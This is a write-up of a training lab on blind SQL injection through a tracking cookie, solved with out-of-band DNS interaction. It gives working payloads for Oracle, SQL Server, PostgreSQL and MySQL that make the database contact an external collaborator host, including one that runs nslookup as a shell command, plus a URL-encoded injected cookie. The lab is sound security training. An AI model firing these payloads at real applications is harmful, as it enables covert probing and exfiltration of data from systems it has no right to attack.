# Lab: Blind SQL injection with out-of-band interaction

## Lab

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

## Hint

You can find some useful payloads on our SQL injection cheat sheet. 

## Solution

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator. This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to Burp Suite Professional with no configuration required.

The techniques for triggering a DNS query are highly specific to the type of database being used:
|SQL Server |Payload                                                                                                                                        |
|-----------|-----------------------------------------------------------------------------------------------------------------------------------------------|
|Oracle     |<code>SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual            </code>|
|Microsoft  |<code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'                                                                         </code>|
|PostgreSQL |<code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'                                                                </code>|
|MySQL      |<code>LOAD_FILE('\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')<br />SELECT ... INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\a'                                                                                      </code>|


Fuzzing the payloads:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//6ho8e3moxa93hpfctfi0p8n84zapye.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--'
```

So that we solved this lab